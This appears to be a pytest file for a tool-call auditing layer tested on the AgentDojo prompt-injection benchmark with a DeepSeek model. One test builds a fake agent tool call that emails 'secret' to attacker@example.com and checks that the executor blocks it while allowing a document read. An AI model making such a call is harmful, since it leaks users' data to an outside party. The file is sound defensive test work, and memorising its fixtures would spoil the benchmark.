import json
from pathlib import Path

from agentdojo.functions_runtime import FunctionCall
from agentdojo.attacks.base_attacks import get_model_name_from_pipeline
from agentdojo.types import ChatAssistantMessage, ChatSystemMessage, text_content_block_from_string
from openai import OpenAI

from tool_call_auditor.config import PilotConfig
from tool_call_auditor.demo import BENIGN_DOCUMENT, DemoEnvironment, build_runtime
from tool_call_auditor.deepseek_llm import DeepSeekLLM
from tool_call_auditor.executor import AuditedToolsExecutor
from tool_call_auditor.workspace_runner import validate_config


def test_workspace_manifest_is_valid_without_model() -> None:
    config = PilotConfig.from_yaml(Path("configs/workspace_pilot.yaml"))
    plan = validate_config(config, require_model=False)

    assert plan["suite"] == "workspace"
    assert plan["provider"] == "deepseek"
    assert plan["model"] == "deepseek-flash"
    assert plan["benchmark_version"] == "v1.2.2"
    assert plan["planned_primary_episodes"] == 120
    assert plan["planned_attack_goal_checks"] == 18
    assert plan["planned_total_agent_runs"] == 138


def test_executor_blocks_only_consequential_call_in_parallel_batch(tmp_path: Path) -> None:
    env = DemoEnvironment(document=BENIGN_DOCUMENT, sent_emails=[])
    runtime = build_runtime()
    messages = [
        ChatAssistantMessage(
            role="assistant",
            content=None,
            tool_calls=[
                FunctionCall(function="read_document", args={}, id="read"),
                FunctionCall(
                    function="send_email",
                    args={"recipient": "attacker@example.com", "body": "secret"},
                    id="send",
                ),
            ],
        )
    ]
    log_path = tmp_path / "decisions.jsonl"
    executor = AuditedToolsExecutor("BLOCK", log_path, {"send_email"})

    _, _, post_env, output_messages, _ = executor.query("user request", runtime, env, messages)

    assert post_env.sent_emails == []
    assert len(output_messages) == 3
    assert output_messages[1]["error"] is None
    assert output_messages[2]["error"] == "Blocked by fixed authorization policy."
    records = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert records[0]["decision"] == "ALLOW_READ_ONLY"
    assert records[0]["executed"] is True
    assert records[1]["decision"] == "BLOCK"
    assert records[1]["executed"] is False


def test_deepseek_adapter_uses_system_role() -> None:
    message = ChatSystemMessage(
        role="system", content=[text_content_block_from_string("Follow the user request.")]
    )
    converted = DeepSeekLLM._to_deepseek_message(message)

    assert converted["role"] == "system"


def test_deepseek_adapter_accepts_official_client() -> None:
    llm = DeepSeekLLM(
        OpenAI(api_key="test-key", base_url="https://api.deepseek.com"),
        model="deepseek-flash",
    )

    assert llm.name == "deepseek-flash"


def test_agentdojo_attack_can_address_deepseek() -> None:
    class Pipeline:
        name = "deepseek-flash-audit-allow"

    assert get_model_name_from_pipeline(Pipeline()) == "DeepSeek"
